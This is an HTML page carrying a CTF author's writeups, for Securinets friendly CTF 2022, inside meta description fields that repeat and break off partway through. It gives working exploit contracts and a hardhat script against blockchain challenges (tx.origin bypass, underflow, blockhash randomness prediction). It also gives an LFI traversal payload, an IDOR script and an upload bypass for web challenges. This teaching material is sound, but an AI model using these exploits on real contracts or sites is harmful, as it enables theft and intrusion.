<!DOCTYPE html><html><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width"/><title>Securinets friendly CTF 2k22 - Author Writeups</title><link rel="preload" as="font" href=""/><meta name="description" content=" for the 7 blockchain challenges. The challenges&#x27; difficulties ranged from basic to medium. I wasn&#x27;t intending to release the 2 last challenges but I had to give something for the advanced players.


## 3xplorer

![3xplorer](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924237/Friendly-ctf/explorer_xsz6vl.png)

1. Visit https://goerli.etherscan.io/
2. Put the contract&#x27;s address
3. &gt; Contract section &gt; Read contract
4. Get the flag `securinets{3xpl0r3_7h3_l4nd5_4nd_f1nd_7h3_37h3r5}`

### #1 Lesson learned

I know how to get informations about a contract by using a block explorer.

## S0lx

![S0lx](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924217/Friendly-ctf/solx_bomnck.png)

1. Read the solidity file

   ```js
       string public immutable X=&quot;COntr4cts_&quot;;
       function answer() public returns (string memory) {
           S = &quot;S0l1dItY_&quot;;
           O = &quot;securinets{&quot;;
           L = &quot;ARe_4w3s0m3}&quot;;
           return string(abi.encodePacked(O,S, X, L));
   ```

2. We are concatenating a string here using `abi.encodePacked` (encoding bytes basically and packing them together ~ low level string concatination)
3. Get the letters content in the right order -&gt; `securinets{S0l1dItY_COntr4cts_ARe_4w3s0m3}`

### #2 Lesson learned

Solidity is a cool language, but it has its own way of doing things.

---

## Int3r4ct

![Int3r4ct](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924218/Friendly-ctf/int3ra4ct_holqse.png)

1. Change metamask connection to goerli testnet. [Tutorial](https://blog.cryptostars.is/goerli-g%C3%B6rli-testnet-network-to-metamask-and-receiving-test-ethereum-in-less-than-2-min-de13e6fe5677)

2. Open the developer&#x27;s console `CTRL+SHIT+I`
3. Logs indicate that `web3js` and `InteractContract` are injected into the console.
4. Now seeing the docs of `web3js` library we see that to call a contract we have to do `contractInstance.methods.methodName().call()` and it returns a promise
   [Web3js Docs Reference](https://web3js.readthedocs.io/en/v1.2.11/web3-eth-contract.html#methods-mymethod-call)
5. Execute it, we should add `await` because it returns a promise. `await InteractContract.methods.FLAG().call()`
6. Enjoy the flag `securinets{Y0u_Int3r4ct3d_With_The_Contr4ct_Usin6_The_Web3j_L1br4ry}`

### #3 Lesson Learned

There are librairies with which you can craft payloads and different scripts. They can make your life a lot easier !

---

## Gr33dyR0b0t

![Greedy Robot](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924235/Friendly-ctf/greedy-robots-ch_rnd2ve.png)

1. Change metamask connection to goerli testnet. [Tutorial](https://blog.cryptostars.is/goerli-g%C3%B6rli-testnet-network-to-metamask-and-receiving-test-ethereum-in-less-than-2-min-de13e6fe5677)
2. Do some web enumeration, you will find the robot address in a html comment
   &gt; DEV NOTE: Hook contract to dapp 0x79089d5B521030852EdEEeF47A3cD726F3d59e7b

![Send Ethers with metamask](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924238/Friendly-ctf/send-ethers-metamask_ymvjpv.png)

3. Send ethers to the robot and get the flag `securinets{p0intless_g3n3ros1tY}`

### #4 Lesson learned

Sending money in the blockchain is so easy. But that what makes it a source of danger.

---

## No Man&#x27;s Land

![No Man&#x27;s Land](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924234/Friendly-ctf/No-man-land_edtogs.png)

```js
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract NoManLand {
    mapping(address =&gt; bool) flagHolders;

    event WonFlag(address indexed);

    function sendFlag() public returns (bool) {
        require(
            tx.origin != msg.sender,
            &quot;Hey you are not getting the point here&quot;
        );
        flagHolders[tx.origin] = true;
        emit WonFlag(tx.origin);
        return true;
    }

    function canGetFlag(address playerAddress) public view returns (bool) {

        return flagHolders[playerAddress];
    }
}
```

1. We can notice the `require()`, it reverts the transaction when `tx.origin!=msg.sender`

So let&#x27;s understand what&#x27;s `tx.origin` and `msg.sender`:

- `tx.origin` is the address that started the transactions.( Called a function of a contract which calls the function from another contract client -&gt; contract -&gt; contract falls all under one transaction. The client here is the `tx.origin`.
- `msg.sender` is the direct address of the one that is calling the function. So if we got contract1 -&gt; contract2 -&gt; contract3 where `-&gt;` is a function call. The contract3 will have as `msg.sender` value the address of the contract2 and `contract2` will have as `msg.sender` value the address of contract1.

[Consensys Tx.origin](https://consensys.github.io/smart-contract-best-practices/development-recommendations/solidity-specific/tx-origin/)

2. So let&#x27;s craft a contract that works as an intermediate to calling the `sendFlag` function.

```js
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface NoManLand{
      function sendFlag() public returns (bool) ;
}

contract Solver {
    NoManLand public victimContract;


    constructor(address victimAddress){
        victimContract=NoManLand(victimAddress);
    }

    function getFlag() public returns (bool){
        victimContract.sendFlag();
        return victimContract.canGetFlag(tx.origin);
    }
}
```

We can use [Remix IDE](https://remix.ethereum.org/), to deploy the contract. 4. We execute the `getFlag` 3. After the transaction succeeds,We go to the website and verify.
`securinets{F4ck_Hnm4ns_Sm4rt_C0n5racts_R0kx}`

### #5 Lesson learned

- `tx.origin` is a bad way to identify the other party.

---

## EndGame

![End game](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924238/Friendly-ctf/endgame_cfigxc.png)

1. Reading the logic of the contract we find one interesting function:

```js
    function climbLeaderboard(uint256 tryhardCoeff, address realPlayerAddress)
            public
        {
            // If you have a flag why do you have to call it again (just to not add useless events. I need to keep track of solves )
            require(!flagHolders[msg.sender]);
            require(players[realPlayerAddress], &quot;You are not a player&quot;);
            require(
                playersHealth[realPlayerAddress] - 100 * tryhardCoeff &gt; 0,
                &quot;Player is dead&quot;
            );

            playersHealth[realPlayerAddress] -= 200 * tryhardCoeff;
            playersPoints[realPlayerAddress] += 100;

            if (playersPoints[realPlayerAddress] &gt; 1000) {
                emit WonFlag(tx.origin);
                flagHolders[msg.sender]=true;
            }
        }
```

2. If we follow the contract&#x27;s logic. We will lose the game certainly as our health will deplete faster than the points we gain. Okay so we have `playersHealth[realPlayerAddress] -= 200 * tryhardCoeff;`. It&#x27;s subtracting a positive value from `uint` and has a coefficient that we control. That makes it vulnerable both logically by throwing zero to it and for the expert eyes to underflow. That means when when the result value of the operation &lt;0, it will underflow to take the maximum value which is in our case 2^265. A good article to better understand what I am talking about [Underflow and overflow article](https://hackernoon.com/hack-solidity-integer-overflow-and-underflow). I didn&#x27;t want to force a solution as most are beginners and not familiar with the solidity language ^^.
3. Okay so we have just to pass a value for the coefficient that is `&gt;=11` to cause the underflow then we spam the `climbLeaderboard` till we get an error.
4. Here is a smart contract to do it.

&gt; PS: The vulnerability is patched since the 0.5.0 [Github issue](https://github.com/ethereum/solidity/issues/796) &gt; `securinets{0d0m3t3r_4r3_Th3_G0ds_0f_0verfl000w}`

### #7 Lesson learned

Solidity is not the perfect language.

---

## Crazy Gambler

![Crazy gambler](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924214/Friendly-ctf/crazy-gambler_hxbelt.png)

This task is really a challenging one. I was hesitant at first for adding it as I had simpler ones. It&#x27;s the only task that forces you to write a script in web3 library. However I was surprised when a participant told me he did manually ! That&#x27;s a lot of perseverance and dedication, It&#x27;s truly amazing.

1. Read the contract

```js
 function _rollDice() internal view returns (uint256) {
        uint256 blockNo = block.number - 1;
        uint256 diceRes = uint256(blockhash(blockNo)) % 3;
        return diceRes;
    }

    function trialCredit() public {
        require(!gotTrial[msg.sender], &quot;You already got your trial credits&quot;);
        gamblersCredit[msg.sender] += 7;
    }

    function gamble(address ownerAddress) public {
        // Fuck off, No need to emit event again.
        require(!flagHolders[ownerAddress]);
        uint256 roll = _rollDice();

        if (roll == 0) {
            gamblersCredit[msg.sender] += 1;
        } else {
            gamblersCredit[msg.sender] = 0;
        }

        // We get flag when we reach 20 !
        if (gamblersCredit[msg.sender] ==20) {
            flagHolders[ownerAddress] = true;

            // Good bye gambler :)
            gamblersCredit[msg.sender] = 0;
            emit WonFlag(ownerAddress);
        }
    }
```

So we are trying to mimicate randomness by using the `block number`. Okay so if you don&#x27;t what are blocks in the blockchain. I really recommend [Jargon Reference](https://www.upgrad.com/blog/blockchain-architecture/). Why I said mimicate ? Well, because block number is something anyone has access to. So predicting the value is really easy.

Let&#x27;s craft an evil contract that will implement `_rollDice` and call the gamble if we get the `0` value.

&gt; I copied and pasted the CrazyGambler contract&#x27;s code from the etherscan interface.

One other interesting thing:

```js
function trialCredit() public {
        require(!gotTrial[msg.sender], &quot;You already got your trial credits&quot;);
        gamblersCredit[msg.sender] += 7;
    }

```

Here I am doing the check if the user got a trial or not but I am not modifying that value anywhere. So the user can get infinite `trialCredit`.
We can use that to get close to our target value of credits which is `20`.
Also, it allows the player to reuse its address.

Let&#x27;s craft our evil contract then..

```js
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import &quot;./CrazyGambler.sol&quot;;

contract ExploitContract {
    CrazyGambler crazyGambler;

    constructor(address victimAddress) {
        // Setting our target
        crazyGambler = CrazyGambler(victimAddress);
    }

    event Gamble(uint256);

    // Using the same function
    function _rollDice() internal view returns (uint256) {

        uint256 blockNo = block.number - 1;
        uint256 diceRes = uint256(blockhash(blockNo)) % 3;
        return diceRes;
    }

    //
    function initThing() public {
        crazyGambler.trialCredit();
        crazyGambler.trialCredit();
    }

    function tryToSolve() public  {
        uint256 res = _rollDice();
        // The same check as in gamble
        if (res == 0) {
            crazyGambler.gamble(msg.sender);
        }
        // Here to keep track of our progress
        uint256 currentCredit = crazyGambler.gamblersCredit(address(this));
        // Emitting an event is like announcing something. It&#x27;s really good
        // to inform off-chain parties of on-chain updates
        emit Gamble(currentCredit);
    }
}
```

I used both `hardhat` and `foundry` for scripting the exploit. We need to call the function tryToSolve till we get to 20.
, but I will share the `hardhat` one because it&#x27;s easier to understand as it&#x27;s javascript code. ( well I write in Typescript. Can&#x27;t live without type safety )

```js
import { ethers, getNamedAccounts } from &quot;hardhat&quot;;
import { CrazyGambler, ExploitContract } from &quot;../typechain-types&quot;;

let crazyGambler: CrazyGambler;
let exploitContract: ExploitContract;
let deployer: string;


const setUp = async () =&gt; {
    // Getting my private key
    deployer = (await getNamedAccounts()).deployer;

    // Getting the crazy gambler&#x27;s address
    const crazyGamblerAddress = &quot;0x55409Be51f453acCDbab41c439545FA317C0508b&quot;

    // Uncomment to use for deploy a contract and start the exploit
    crazyGambler = await ethers.getContractAt(&quot;CrazyGambler&quot;, crazyGamblerAddress);
    // Deploying my exploit contract
    const exploitContractFactory = await ethers.getContractFactory(&quot;ExploitContract&quot;);
    const tx = await exploitContractFactory.deploy(crazyGamblerAddress)
    exploitContract = await tx.deployed();

    //  Comment that to reuse the contract, (might crash because a transaction fail or hit the rate limit on the Infura Node )
    // exploitContract = await ethers.getContractAt(&quot;ExploitContract&quot;, &quot;0x2CAa717BaA85A0B5B39798bDB9121243D84Fe2E3&quot;);
    console.log(&#x27;deployed exploit contract&#x27;, exploitContract.address)

}


const solve = async () =&gt; {
    let solved = false;

    // Uncomment that when you are using the contract for the first time
    await (await exploitContract.initThing({ gasLimit: 300000 })).wait(1)

    // Keeping track of the balance
    let currentBalance = (await crazyGambler.gamblersCredit(exploitContract.address)).toNumber();

    console.log(&#x27;current balance&#x27;, currentBalance)

    while (!solved) {
        try {
            const res = await (await exploitContract.tryToSolve({ gasLimit: 300000 })).wait()
            console.log((res as any)?.events[0]?.args[0].toNumber())
        }
        catch (error: any) {
            console.log(error.message)

        }

        // Updating balance
        currentBalance = (await crazyGambler.gamblersCredit(deployer)).toNumber();
        console.log(&#x27;current balance&#x27;, currentBalance)
        // So the script don&#x27;t overrun
        if (currentBalance &gt;= 20) break;


        // Algorithm foo
        solved = await crazyGambler.canGetFlag(deployer, { gasLimit: 30000 });
        console.log(&quot;Yes it&#x27;s solved&quot;)

    }
}

async function main() {
    await setUp();
    await solve();
}

main().then(() =&gt; console.log(&#x27;finished&#x27;)).catch(error =&gt; {
    console.log(error)
})

```

`securinets{G4mbl1ng_Th3_Bl0ck_1s_A_MyTh}`

&gt; Kudos to one participant, who did execute the script manually. It&#x27;s really hard to do so. 30% chance to get a good hash ( Not really but we can say so) and with
&gt; a block time of 15 seconds. The script should run for some time. Mine did solve it in 30 minute while. I know it&#x27;s not the best way to present such a task. But that&#x27;s the closest to how hacks happen on the mainnet. They needs patience.

![Picture of participant conversation](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664925884/Friendly-ctf/odd_elq1gd.png)

### Lesson Learned

- Randomness is impossible to perform in the blockchain world without the help of off-chain solutions. Oracles are made for that. But wait how trustful are they ?

---

## There is more than the eye can see

### Greedy Robot: the mean solution `mean for the robot ofc :)`

Okay so here is the trick, there are two intended solutions to this task each one gives different insight.

Most people stopped the enumeration and went to search how they can send ethers on the blockchain even that the price is high ( half what the alchemy - most generous faucet) gives you.

That&#x27;s the basic challenge, but I wanted to raise the concern that in the dapps world there is huge immaturity from the developers in their approach of integrating blockchain with old technologies ( web tech in this situation ). If you check the contract&#x27;s source code by using the `etherscan`.

```js
function canPass(address contributorAddress) public view returns (bool) {
        return contributors[contributorAddress] &gt;= MINIMUM_CONTRIBUTION;
    }
```

Okay so it&#x27;s passing the address and checking if it has sent ethers or not. Seeing the client of the dapp, It&#x27;s sending the address

![Request](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924237/Friendly-ctf/vulnerable-request_cdtawm.png)

So, the server is actually checking if the user sent the ethers or not by calling the canPass from the contract. Wait, there is no mechanism to ensure that it&#x27;s the same user who sent the ethers is using the dapp right now.

I even sent ethers myself to the contract so anyone can grab my address and send it to the api to get the flag :)

![Other](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924238/Friendly-ctf/greedy-robots-tx-logs_mnv9z5.png)

```bash
curl  https://greedy-robots.ctf.securinets.tn/api/flag --json &#x27;{{&quot;address&quot;:&quot;0x84e7a3679A82C2766Ff8382862ab883FF9460307&quot;}}
```

![Evil R0b0t](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924235/Friendly-ctf/evil-robot_ic0ajq.png)

Now you get the challenge name `securinets{p0intless_g3n3ros1tY}`

### #8 Lesson learned

The weakest link in blockchain is its integration with current technologies. Never forget the old arts !

---

---

# Web

## Cr4zy-Js0n

![Cr4zy-Js0n](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924233/Friendly-ctf/crazy-json_xbuh1l.png)

I really want to apologize for the confusion this task has created. I wanted to expose the beginner to JSON which is a data format commonly used in web application nowadays. Didn&#x27;t mean to create confusion on getting answers to the gates. I wanted it to be a fun task :/ .

#### **Solution**

```bash
curl URL -X POST --json &#x27;{&quot;answers&quot;:[{&quot;Gate One&quot;:&quot;Man&quot;},{&quot;Gate Two&quot;:true},{&quot;Gate Three&quot;:12}]}&#x27;
```

`securinets{w3b_5p34k5_j50n_It_S4fe?}`

---

## Agent-007

![Agent-007](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924233/Friendly-ctf/agent-007_k9g2vn.png)

#### **Solution**

User-agent header to identify user&#x27;s browser. Used to identify secret agents.

```bash
`curl URL -H &quot;User-Agent: James Bond&quot;`
```

## L0ki-Was-L0st

![L0ki-Was-L0st](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924213/Friendly-ctf/l0ki-w4s-l0st_ynzmxn.png)

&gt; I didn&#x27;t watch the movie/serie It&#x27;s totally inspired for my interest for Nordic/Pagan Mythology :P

Simple LFI vulnerability on `page` url paramater. get the flag by visiting `URL?page=../../../flag.txt`.

`securinets{L00k_4_LF1_N0T_F0R_L0K1}`

## F00ly-F4ct0ry

![F00ly-F4ct0ry](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924232/Friendly-ctf/fooly-f4ctory_hv3dwq.png)

- [IDOR ressource](https://portswigger.net/web-security/access-control/idor)

```py
import requests
import os

URL=&#x27;URL_HERE&#x27;


session = requests.Session()
with requests.Session() as s:
    login_resp= s.post(URL+&#x27;/login&#x27;,data={&quot;username&quot;:&quot;test2&quot;,&quot;password&quot;:&quot;test2&quot;})
    mecha_resp= s.get(URL+&#x27;/mecha/1&#x27;)

    start_flag_index=mecha_resp.text.index(&#x27;securinets&#x27;)
    end_flag_index=mecha_resp.text.index(&#x27;}&#x27;)
    print(mecha_resp.text[start_flag_index:end_flag_index+1])
```

`securinets{F00LY_ID0R_Is_C00L}`

## F4ke-Upl04d

Here we will apply the basic upload filter bypass technique which is changing the file extension.

In the website, it asks only for png/pdf. So how about we modify a `document.pdf` to `document.pdf.png` ?
It&#x27;s checking for file extension only so by sending a faked file extension it gives you the flag !

`securinets{4lw4y5_ch3ck_m461c_numb3r5}`

## After words

I am glad to see you all enjoyed our CTF and learned new things. That&#x27;s the first time I write in a CTF and I loved seeing people enjoying the CTF and some of my task (definitely not Cr4zy-Js0n). In Securinets INSAT, We are going soon to have workshops where beginners who want to advance will have the opportunity to. Follow us on social media for our upcoming news and events !
"/><meta property="og:title" content="Securinets friendly CTF 2k22 - Author Writeups"/><meta property="og:description" content=" for the 7 blockchain challenges. The challenges&#x27; difficulties ranged from basic to medium. I wasn&#x27;t intending to release the 2 last challenges but I had to give something for the advanced players.


## 3xplorer

![3xplorer](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924237/Friendly-ctf/explorer_xsz6vl.png)

1. Visit https://goerli.etherscan.io/
2. Put the contract&#x27;s address
3. &gt; Contract section &gt; Read contract
4. Get the flag `securinets{3xpl0r3_7h3_l4nd5_4nd_f1nd_7h3_37h3r5}`

### #1 Lesson learned

I know how to get informations about a contract by using a block explorer.

## S0lx

![S0lx](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924217/Friendly-ctf/solx_bomnck.png)

1. Read the solidity file

   ```js
       string public immutable X=&quot;COntr4cts_&quot;;
       function answer() public returns (string memory) {
           S = &quot;S0l1dItY_&quot;;
           O = &quot;securinets{&quot;;
           L = &quot;ARe_4w3s0m3}&quot;;
           return string(abi.encodePacked(O,S, X, L));
   ```

2. We are concatenating a string here using `abi.encodePacked` (encoding bytes basically and packing them together ~ low level string concatination)
3. Get the letters content in the right order -&gt; `securinets{S0l1dItY_COntr4cts_ARe_4w3s0m3}`

### #2 Lesson learned

Solidity is a cool language, but it has its own way of doing things.

---

## Int3r4ct

![Int3r4ct](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924218/Friendly-ctf/int3ra4ct_holqse.png)

1. Change metamask connection to goerli testnet. [Tutorial](https://blog.cryptostars.is/goerli-g%C3%B6rli-testnet-network-to-metamask-and-receiving-test-ethereum-in-less-than-2-min-de13e6fe5677)

2. Open the developer&#x27;s console `CTRL+SHIT+I`
3. Logs indicate that `web3js` and `InteractContract` are injected into the console.
4. Now seeing the docs of `web3js` library we see that to call a contract we have to do `contractInstance.methods.methodName().call()` and it returns a promise
   [Web3js Docs Reference](https://web3js.readthedocs.io/en/v1.2.11/web3-eth-contract.html#methods-mymethod-call)
5. Execute it, we should add `await` because it returns a promise. `await InteractContract.methods.FLAG().call()`
6. Enjoy the flag `securinets{Y0u_Int3r4ct3d_With_The_Contr4ct_Usin6_The_Web3j_L1br4ry}`

### #3 Lesson Learned

There are librairies with which you can craft payloads and different scripts. They can make your life a lot easier !

---

## Gr33dyR0b0t

![Greedy Robot](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924235/Friendly-ctf/greedy-robots-ch_rnd2ve.png)

1. Change metamask connection to goerli testnet. [Tutorial](https://blog.cryptostars.is/goerli-g%C3%B6rli-testnet-network-to-metamask-and-receiving-test-ethereum-in-less-than-2-min-de13e6fe5677)
2. Do some web enumeration, you will find the robot address in a html comment
   &gt; DEV NOTE: Hook contract to dapp 0x79089d5B521030852EdEEeF47A3cD726F3d59e7b

![Send Ethers with metamask](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924238/Friendly-ctf/send-ethers-metamask_ymvjpv.png)

3. Send ethers to the robot and get the flag `securinets{p0intless_g3n3ros1tY}`

### #4 Lesson learned

Sending money in the blockchain is so easy. But that what makes it a source of danger.

---

## No Man&#x27;s Land

![No Man&#x27;s Land](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924234/Friendly-ctf/No-man-land_edtogs.png)

```js
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract NoManLand {
    mapping(address =&gt; bool) flagHolders;

    event WonFlag(address indexed);

    function sendFlag() public returns (bool) {
        require(
            tx.origin != msg.sender,
            &quot;Hey you are not getting the point here&quot;
        );
        flagHolders[tx.origin] = true;
        emit WonFlag(tx.origin);
        return true;
    }

    function canGetFlag(address playerAddress) public view returns (bool) {

        return flagHolders[playerAddress];
    }
}
```

1. We can notice the `require()`, it reverts the transaction when `tx.origin!=msg.sender`

So let&#x27;s understand what&#x27;s `tx.origin` and `msg.sender`:

- `tx.origin` is the address that started the transactions.( Called a function of a contract which calls the function from another contract client -&gt; contract -&gt; contract falls all under one transaction. The client here is the `tx.origin`.
- `msg.sender` is the direct address of the one that is calling the function. So if we got contract1 -&gt; contract2 -&gt; contract3 where `-&gt;` is a function call. The contract3 will have as `msg.sender` value the address of the contract2 and `contract2` will have as `msg.sender` value the address of contract1.

[Consensys Tx.origin](https://consensys.github.io/smart-contract-best-practices/development-recommendations/solidity-specific/tx-origin/)

2. So let&#x27;s craft a contract that works as an intermediate to calling the `sendFlag` function.

```js
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface NoManLand{
      function sendFlag() public returns (bool) ;
}

contract Solver {
    NoManLand public victimContract;


    constructor(address victimAddress){
        victimContract=NoManLand(victimAddress);
    }

    function getFlag() public returns (bool){
        victimContract.sendFlag();
        return victimContract.canGetFlag(tx.origin);
    }
}
```

We can use [Remix IDE](https://remix.ethereum.org/), to deploy the contract. 4. We execute the `getFlag` 3. After the transaction succeeds,We go to the website and verify.
`securinets{F4ck_Hnm4ns_Sm4rt_C0n5racts_R0kx}`

### #5 Lesson learned

- `tx.origin` is a bad way to identify the other party.

---

## EndGame

![End game](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924238/Friendly-ctf/endgame_cfigxc.png)

1. Reading the logic of the contract we find one interesting function:

```js
    function climbLeaderboard(uint256 tryhardCoeff, address realPlayerAddress)
            public
        {
            // If you have a flag why do you have to call it again (just to not add useless events. I need to keep track of solves )
            require(!flagHolders[msg.sender]);
            require(players[realPlayerAddress], &quot;You are not a player&quot;);
            require(
                playersHealth[realPlayerAddress] - 100 * tryhardCoeff &gt; 0,
                &quot;Player is dead&quot;
            );

            playersHealth[realPlayerAddress] -= 200 * tryhardCoeff;
            playersPoints[realPlayerAddress] += 100;

            if (playersPoints[realPlayerAddress] &gt; 1000) {
                emit WonFlag(tx.origin);
                flagHolders[msg.sender]=true;
            }
        }
```

2. If we follow the contract&#x27;s logic. We will lose the game certainly as our health will deplete faster than the points we gain. Okay so we have `playersHealth[realPlayerAddress] -= 200 * tryhardCoeff;`. It&#x27;s subtracting a positive value from `uint` and has a coefficient that we control. That makes it vulnerable both logically by throwing zero to it and for the expert eyes to underflow. That means when when the result value of the operation &lt;0, it will underflow to take the maximum value which is in our case 2^265. A good article to better understand what I am talking about [Underflow and overflow article](https://hackernoon.com/hack-solidity-integer-overflow-and-underflow). I didn&#x27;t want to force a solution as most are beginners and not familiar with the solidity language ^^.
3. Okay so we have just to pass a value for the coefficient that is `&gt;=11` to cause the underflow then we spam the `climbLeaderboard` till we get an error.
4. Here is a smart contract to do it.

&gt; PS: The vulnerability is patched since the 0.5.0 [Github issue](https://github.com/ethereum/solidity/issues/796) &gt; `securinets{0d0m3t3r_4r3_Th3_G0ds_0f_0verfl000w}`

### #7 Lesson learned

Solidity is not the perfect language.

---

## Crazy Gambler

![Crazy gambler](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924214/Friendly-ctf/crazy-gambler_hxbelt.png)

This task is really a challenging one. I was hesitant at first for adding it as I had simpler ones. It&#x27;s the only task that forces you to write a script in web3 library. However I was surprised when a participant told me he did manually ! That&#x27;s a lot of perseverance and dedication, It&#x27;s truly amazing.

1. Read the contract

```js
 function _rollDice() internal view returns (uint256) {
        uint256 blockNo = block.number - 1;
        uint256 diceRes = uint256(blockhash(blockNo)) % 3;
        return diceRes;
    }

    function trialCredit() public {
        require(!gotTrial[msg.sender], &quot;You already got your trial credits&quot;);
        gamblersCredit[msg.sender] += 7;
    }

    function gamble(address ownerAddress) public {
        // Fuck off, No need to emit event again.
        require(!flagHolders[ownerAddress]);
        uint256 roll = _rollDice();

        if (roll == 0) {
            gamblersCredit[msg.sender] += 1;
        } else {
            gamblersCredit[msg.sender] = 0;
        }

        // We get flag when we reach 20 !
        if (gamblersCredit[msg.sender] ==20) {
            flagHolders[ownerAddress] = true;

            // Good bye gambler :)
            gamblersCredit[msg.sender] = 0;
            emit WonFlag(ownerAddress);
        }
    }
```

So we are trying to mimicate randomness by using the `block number`. Okay so if you don&#x27;t what are blocks in the blockchain. I really recommend [Jargon Reference](https://www.upgrad.com/blog/blockchain-architecture/). Why I said mimicate ? Well, because block number is something anyone has access to. So predicting the value is really easy.

Let&#x27;s craft an evil contract that will implement `_rollDice` and call the gamble if we get the `0` value.

&gt; I copied and pasted the CrazyGambler contract&#x27;s code from the etherscan interface.

One other interesting thing:

```js
function trialCredit() public {
        require(!gotTrial[msg.sender], &quot;You already got your trial credits&quot;);
        gamblersCredit[msg.sender] += 7;
    }

```

Here I am doing the check if the user got a trial or not but I am not modifying that value anywhere. So the user can get infinite `trialCredit`.
We can use that to get close to our target value of credits which is `20`.
Also, it allows the player to reuse its address.

Let&#x27;s craft our evil contract then..

```js
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import &quot;./CrazyGambler.sol&quot;;

contract ExploitContract {
    CrazyGambler crazyGambler;

    constructor(address victimAddress) {
        // Setting our target
        crazyGambler = CrazyGambler(victimAddress);
    }

    event Gamble(uint256);

    // Using the same function
    function _rollDice() internal view returns (uint256) {

        uint256 blockNo = block.number - 1;
        uint256 diceRes = uint256(blockhash(blockNo)) % 3;
        return diceRes;
    }

    //
    function initThing() public {
        crazyGambler.trialCredit();
        crazyGambler.trialCredit();
    }

    function tryToSolve() public  {
        uint256 res = _rollDice();
        // The same check as in gamble
        if (res == 0) {
            crazyGambler.gamble(msg.sender);
        }
        // Here to keep track of our progress
        uint256 currentCredit = crazyGambler.gamblersCredit(address(this));
        // Emitting an event is like announcing something. It&#x27;s really good
        // to inform off-chain parties of on-chain updates
        emit Gamble(currentCredit);
    }
}
```

I used both `hardhat` and `foundry` for scripting the exploit. We need to call the function tryToSolve till we get to 20.
, but I will share the `hardhat` one because it&#x27;s easier to understand as it&#x27;s javascript code. ( well I write in Typescript. Can&#x27;t live without type safety )

```js
import { ethers, getNamedAccounts } from &quot;hardhat&quot;;
import { CrazyGambler, ExploitContract } from &quot;../typechain-types&quot;;

let crazyGambler: CrazyGambler;
let exploitContract: ExploitContract;
let deployer: string;


const setUp = async () =&gt; {
    // Getting my private key
    deployer = (await getNamedAccounts()).deployer;

    // Getting the crazy gambler&#x27;s address
    const crazyGamblerAddress = &quot;0x55409Be51f453acCDbab41c439545FA317C0508b&quot;

    // Uncomment to use for deploy a contract and start the exploit
    crazyGambler = await ethers.getContractAt(&quot;CrazyGambler&quot;, crazyGamblerAddress);
    // Deploying my exploit contract
    const exploitContractFactory = await ethers.getContractFactory(&quot;ExploitContract&quot;);
    const tx = await exploitContractFactory.deploy(crazyGamblerAddress)
    exploitContract = await tx.deployed();

    //  Comment that to reuse the contract, (might crash because a transaction fail or hit the rate limit on the Infura Node )
    // exploitContract = await ethers.getContractAt(&quot;ExploitContract&quot;, &quot;0x2CAa717BaA85A0B5B39798bDB9121243D84Fe2E3&quot;);
    console.log(&#x27;deployed exploit contract&#x27;, exploitContract.address)

}


const solve = async () =&gt; {
    let solved = false;

    // Uncomment that when you are using the contract for the first time
    await (await exploitContract.initThing({ gasLimit: 300000 })).wait(1)

    // Keeping track of the balance
    let currentBalance = (await crazyGambler.gamblersCredit(exploitContract.address)).toNumber();

    console.log(&#x27;current balance&#x27;, currentBalance)

    while (!solved) {
        try {
            const res = await (await exploitContract.tryToSolve({ gasLimit: 300000 })).wait()
            console.log((res as any)?.events[0]?.args[0].toNumber())
        }
        catch (error: any) {
            console.log(error.message)

        }

        // Updating balance
        currentBalance = (await crazyGambler.gamblersCredit(deployer)).toNumber();
        console.log(&#x27;current balance&#x27;, currentBalance)
        // So the script don&#x27;t overrun
        if (currentBalance &gt;= 20) break;


        // Algorithm foo
        solved = await crazyGambler.canGetFlag(deployer, { gasLimit: 30000 });
        console.log(&quot;Yes it&#x27;s solved&quot;)

    }
}

async function main() {
    await setUp();
    await solve();
}

main().then(() =&gt; console.log(&#x27;finished&#x27;)).catch(error =&gt; {
    console.log(error)
})

```

`securinets{G4mbl1ng_Th3_Bl0ck_1s_A_MyTh}`

&gt; Kudos to one participant, who did execute the script manually. It&#x27;s really hard to do so. 30% chance to get a good hash ( Not really but we can say so) and with
&gt; a block time of 15 seconds. The script should run for some time. Mine did solve it in 30 minute while. I know it&#x27;s not the best way to present such a task. But that&#x27;s the closest to how hacks happen on the mainnet. They needs patience.

![Picture of participant conversation](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664925884/Friendly-ctf/odd_elq1gd.png)

### Lesson Learned

- Randomness is impossible to perform in the blockchain world without the help of off-chain solutions. Oracles are made for that. But wait how trustful are they ?

---

## There is more than the eye can see

### Greedy Robot: the mean solution `mean for the robot ofc :)`

Okay so here is the trick, there are two intended solutions to this task each one gives different insight.

Most people stopped the enumeration and went to search how they can send ethers on the blockchain even that the price is high ( half what the alchemy - most generous faucet) gives you.

